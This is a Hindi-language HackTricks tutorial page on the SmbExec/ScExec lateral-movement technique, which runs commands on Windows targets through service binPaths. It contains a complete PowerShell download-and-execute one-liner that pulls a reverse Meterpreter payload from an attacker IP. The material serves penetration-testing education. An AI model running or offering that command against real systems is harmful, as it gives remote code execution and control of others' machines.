# SmbExec/ScExec

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

## यह कैसे काम करता है

**Smbexec Psexec की तरह काम करता है।** इस उदाहरण में, हम "_binpath_" को पीड़ित के अंदर के दुर्भावनापूर्ण एक्जीक्यूटेबल की ओर इशारा करने के **बजाय**, हम इसे **cmd.exe या powershell.exe** की ओर इशारा करेंगे और उनमें से एक बैकडोर को डाउनलोड और निष्पादित करेगा।

## **SMBExec**

आइए देखते हैं कि smbexec चलने पर क्या होता है, हमलावर और लक्ष्य की ओर से इसे देखकर:

![](../../.gitbook/assets/smbexec\_prompt.png)

तो हम जानते हैं कि यह "BTOBTO" नामक एक सेवा बनाता है। लेकिन जब हम `sc query` करते हैं तो वह सेवा लक्ष्य मशीन पर मौजूद नहीं होती है। सिस्टम लॉग्स में जो हुआ उसका सुराग मिलता है:

![](../../.gitbook/assets/smbexec\_service.png)

सेवा फ़ाइल नाम में निष्पादित करने के लिए एक कमांड स्ट्रिंग होती है (%COMSPEC% cmd.exe के पूर्ण पथ को इंगित करता है)। यह निष्पादित होने वाले कमांड को एक बैट फ़ाइल में इको करता है, stdout और stderr को एक Temp फ़ाइल में रीडायरेक्ट करता है, फिर बैट फ़ाइल को निष्पादित करता है और उसे हटा देता है। Kali पर वापस, Python स्क्रिप्ट फिर SMB के माध्यम से आउटपुट फ़ाइल को खींचती है और हमारे "pseudo-shell" में सामग्री प्रदर्शित करती है। हमारे "शेल" में हम जो भी कमांड टाइप करते हैं, एक नई सेवा बनाई जाती है और प्रक्रिया दोहराई जाती है। इसीलिए इसे बाइनरी ड्रॉप करने की जरूरत नहीं होती, यह सिर्फ प्रत्येक वांछित कमांड को एक नई सेवा के रूप में निष्पादित करता है। निश्चित रूप से अधिक चुपके से, लेकिन जैसा कि हमने देखा, प्रत्येक निष्पादित कमांड के लिए एक इवेंट लॉग बनाया जाता है। फिर भी एक गैर-इंटरैक्टिव "शेल" प्राप्त करने का एक बहुत ही चतुर तरीका!

## मैनुअल SMBExec

**या सेवाओं के माध्यम से कमांड निष्पादित करना**

जैसा कि smbexec ने दिखाया, बाइनरी की आवश्यकता के बिना सीधे सेवा binPaths से कमांड निष्पादित करना संभव है। यदि आपको लक्ष्य Windows मशीन पर केवल एक मनमाना कमांड निष्पादित करने की आवश्यकता है तो यह एक उपयोगी चाल हो सकती है। एक त्वरित उदाहरण के रूप में, चलिए बिना बाइनरी के एक रिमोट सेवा का उपयोग करके एक Meterpreter शेल प्राप्त करते हैं।

हम Metasploit के `web_delivery` मॉड्यूल का उपयोग करेंगे और एक PowerShell लक्ष्य के साथ एक रिवर्स Meterpreter पेलोड चुनेंगे। लिसनर सेट अप है और यह हमें लक्ष्य मशीन पर निष्पादित करने के लिए कमांड बताता है:
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
हमारे Windows अटैक बॉक्स से, हम एक रिमोट सर्विस ("metpsh") बनाते हैं और binPath को हमारे पेलोड के साथ cmd.exe को एक्जीक्यूट करने के लिए सेट करते हैं:

![](../../.gitbook/assets/sc\_psh\_create.png)

और फिर इसे स्टार्ट करते हैं:

![](../../.gitbook/assets/sc\_psh\_start.png)

यह एरर दिखाता है क्योंकि हमारी सर्विस रिस्पॉन्ड नहीं करती, लेकिन अगर हम हमारे Metasploit लिसनर को देखें तो हमें पता चलता है कि कॉलबैक हुआ और पेलोड एक्जीक्यूट हुआ।

सभी जानकारी यहाँ से निकाली गई थी: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><strong>AWS हैकिंग सीखें शुरुआत से लेकर एक्सपर्ट तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो** करें।
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>
